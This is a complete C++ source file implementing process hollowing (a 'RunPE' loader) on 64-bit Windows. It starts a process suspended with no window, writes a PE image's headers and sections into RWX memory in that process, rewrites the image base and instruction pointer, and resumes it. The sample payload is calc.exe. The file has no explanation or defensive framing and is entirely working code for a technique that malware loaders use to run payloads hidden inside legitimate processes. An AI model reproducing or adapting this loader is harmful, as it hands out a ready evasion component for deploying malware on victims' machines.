#include <iostream>
#include <windows.h>
#include <cstring>
#include <fstream>

bool ReadFileToBuffer(const char* filePath, unsigned char*& buffer, size_t& size)
{
    std::ifstream file(filePath, std::ios::binary | std::ios::ate);
    if (!file.is_open()) {
        std::cerr << "Failed to open file: " << filePath << std::endl;
        return false;
    }

    size = static_cast<size_t>(file.tellg());
    buffer = new unsigned char[size];
    file.seekg(0, std::ios::beg);
    if (!file.read(reinterpret_cast<char*>(buffer), size)) {
        std::cerr << "Failed to read file: " << filePath << std::endl;
        delete[] buffer;
        buffer = nullptr;
        size = 0;
        return false;
    }

    file.close();
    return true;
}

int RunPortableExecutable(void* Image, const char* currentFilePath)
{
    IMAGE_DOS_HEADER* DOSHeader;
    IMAGE_NT_HEADERS64* NtHeader;
    IMAGE_SECTION_HEADER* SectionHeader;

    PROCESS_INFORMATION PI;
    STARTUPINFOA SI;

    CONTEXT CTX;
    DWORD64 ImageBase;
    void* pImageBase;

    int count;

    ZeroMemory(&CTX, sizeof(CTX));

    DOSHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(Image);
    NtHeader = reinterpret_cast<IMAGE_NT_HEADERS64*>(reinterpret_cast<DWORD_PTR>(Image) + DOSHeader->e_lfanew);

    if (NtHeader->Signature != IMAGE_NT_SIGNATURE)
    {
        std::cerr << "Invalid NT Signature" << std::endl;
        return 0;
    }

    ZeroMemory(&PI, sizeof(PI));
    ZeroMemory(&SI, sizeof(SI));
    SI.cb = sizeof(SI);

    if (!CreateProcessA(currentFilePath, NULL, NULL, NULL, FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &SI, &PI))
    {
        std::cerr << "CreateProcess failed: " << GetLastError() << std::endl;
        return 0;
    }

    CTX.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(PI.hThread, &CTX))
    {
        std::cerr << "GetThreadContext failed: " << GetLastError() << std::endl;
        TerminateProcess(PI.hProcess, 0);
        return 0;
    }

    if (!ReadProcessMemory(PI.hProcess, reinterpret_cast<LPCVOID>(CTX.Rdx + 0x10), &ImageBase, sizeof(ImageBase), NULL))
    {
        std::cerr << "ReadProcessMemory failed: " << GetLastError() << std::endl;
        TerminateProcess(PI.hProcess, 0);
        return 0;
    }

    pImageBase = VirtualAllocEx(PI.hProcess, reinterpret_cast<LPVOID>(NtHeader->OptionalHeader.ImageBase),
        NtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (pImageBase == nullptr)
    {
        std::cerr << "VirtualAllocEx failed: " << GetLastError() << std::endl;
        TerminateProcess(PI.hProcess, 0);
        return 0;
    }

    if (!WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL))
    {
        std::cerr << "WriteProcessMemory (headers) failed: " << GetLastError() << std::endl;
        TerminateProcess(PI.hProcess, 0);
        return 0;
    }

    for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++)
    {
        SectionHeader = reinterpret_cast<IMAGE_SECTION_HEADER*>(reinterpret_cast<DWORD_PTR>(Image) + DOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS64) + (count * sizeof(IMAGE_SECTION_HEADER)));

        if (!WriteProcessMemory(PI.hProcess, reinterpret_cast<LPVOID>(reinterpret_cast<DWORD_PTR>(pImageBase) + SectionHeader->VirtualAddress),
            reinterpret_cast<LPVOID>(reinterpret_cast<DWORD_PTR>(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, NULL))
        {
            std::cerr << "WriteProcessMemory (sections) failed: " << GetLastError() << std::endl;
            TerminateProcess(PI.hProcess, 0);
            return 0;
        }
    }

    if (!WriteProcessMemory(PI.hProcess, reinterpret_cast<LPVOID>(CTX.Rdx + 0x10),
        &NtHeader->OptionalHeader.ImageBase, sizeof(NtHeader->OptionalHeader.ImageBase), NULL))
    {
        std::cerr << "WriteProcessMemory (ImageBase) failed: " << GetLastError() << std::endl;
        TerminateProcess(PI.hProcess, 0);
        return 0;
    }

    CTX.Rip = reinterpret_cast<DWORD_PTR>(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
    if (!SetThreadContext(PI.hThread, &CTX))
    {
        std::cerr << "SetThreadContext failed: " << GetLastError() << std::endl;
        TerminateProcess(PI.hProcess, 0);
        return 0;
    }

    if (ResumeThread(PI.hThread) == (DWORD)-1)
    {
        std::cerr << "ResumeThread failed: " << GetLastError() << std::endl;
        TerminateProcess(PI.hProcess, 0);
        return 0;
    }

    WaitForSingleObject(PI.hProcess, INFINITE);

    CloseHandle(PI.hThread);
    CloseHandle(PI.hProcess);

    return 1;
}

int main()
{
    unsigned char* exec;
    size_t size;
    const char* filePath = "C:\\Windows\\System32\\calc.exe";

    if (!ReadFileToBuffer(filePath, exec, size)) {
        std::cerr << "Failed to read the file." << std::endl;
        return 0;
    }

    void* allocatedMem = VirtualAlloc(0, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (allocatedMem == nullptr) {
        std::cerr << "VirtualAlloc failed: " << GetLastError() << std::endl;
        delete[] exec;
        return 0;
    }

    std::memcpy(allocatedMem, exec, size);
    delete[] exec;

    if (!RunPortableExecutable(allocatedMem, filePath)) {
        std::cerr << "Failed to run the portable executable." << std::endl;
        return 0;
    }

    return 0;
}
